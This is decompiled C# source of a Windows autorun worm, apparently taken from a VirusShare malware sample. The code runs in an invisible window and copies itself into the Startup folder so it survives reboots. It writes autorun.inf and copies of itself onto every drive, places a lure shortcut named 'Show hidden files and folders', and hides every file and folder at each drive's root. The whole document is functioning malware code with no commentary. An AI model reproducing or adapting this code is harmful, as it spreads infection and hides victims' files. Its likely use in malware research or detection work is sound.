// Decompiled with JetBrains decompiler
// Type: starpa.Form1
// Assembly: starpa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 60AA55E8-56BF-43AD-925B-E62B86EA4202
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.mf-af455401c7244fca5fdc9d33dfaa88d556138d2bbe8ef78d9ccd32650d8fc536.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace starpa
{
  public class Form1 : Form
  {
    private string show_or_hide;
    private string[] autoruntext = new string[2]
    {
      "[autorun]",
      "open=starpa.exe"
    };
    private string startdisk = Application.ExecutablePath.Substring(0, 3);
    private string[] disks_arr = Environment.GetLogicalDrives();
    private IContainer components = (IContainer) null;
    private RichTextBox richTextBox1;

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e)
    {
      this.WriteLogFile("\r\n" + (object) DateTime.Now + "--->" + Environment.MachineName + "--->" + Environment.UserName);
      try
      {
        File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\starpa.exe", true);
      }
      catch (Exception ex)
      {
        this.WriteLogFile(ex.Message);
      }
      try
      {
        for (int index = 0; index < this.disks_arr.Length; ++index)
        {
          File.WriteAllLines(this.disks_arr[index] + "autorun.inf", this.autoruntext);
          File.Copy(Application.ExecutablePath, this.disks_arr[index] + "starpa.exe", true);
          File.Copy(Application.StartupPath + "Показать скрытые файлы и папки.lnk", this.disks_arr[index] + "//Показать скрытые файлы и папки.lnk");
        }
      }
      catch (Exception ex)
      {
        this.WriteLogFile(ex.Message);
      }
      try
      {
        this.show_or_hide = Environment.GetCommandLineArgs()[1];
      }
      catch
      {
      }
      for (int index1 = 0; index1 < this.disks_arr.Length; ++index1)
      {
        string[] directories = Directory.GetDirectories(this.disks_arr[index1]);
        string[] files = Directory.GetFiles(this.disks_arr[index1]);
        for (int index2 = 0; index2 < directories.Length; ++index2)
        {
          try
          {
            if (this.show_or_hide != "show")
              File.SetAttributes(directories[index2], FileAttributes.Hidden);
            else
              File.SetAttributes(directories[index2], FileAttributes.Normal);
          }
          catch (Exception ex)
          {
            this.WriteLogFile(ex.Message);
          }
        }
        for (int index3 = 0; index3 < files.Length; ++index3)
        {
          try
          {
            if (this.show_or_hide != "show")
              File.SetAttributes(files[index3], FileAttributes.Hidden);
            else
              File.SetAttributes(files[index3], FileAttributes.Normal);
          }
          catch (Exception ex)
          {
            this.WriteLogFile(ex.Message);
          }
        }
      }
      Application.Exit();
    }

    private void WriteLogFile(string writestring)
    {
      try
      {
        File.AppendAllText(this.startdisk + "starpa.log", writestring + "\r\n", Encoding.UTF8);
      }
      catch
      {
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.richTextBox1 = new RichTextBox();
      this.SuspendLayout();
      this.richTextBox1.Dock = DockStyle.Fill;
      this.richTextBox1.Location = new Point(0, 0);
      this.richTextBox1.Name = "richTextBox1";
      this.richTextBox1.Size = new Size(10, 10);
      this.richTextBox1.TabIndex = 0;
      this.richTextBox1.Text = "";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.ControlBox = false;
      this.Controls.Add((Control) this.richTextBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.WindowState = FormWindowState.Minimized;
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }
  }
}
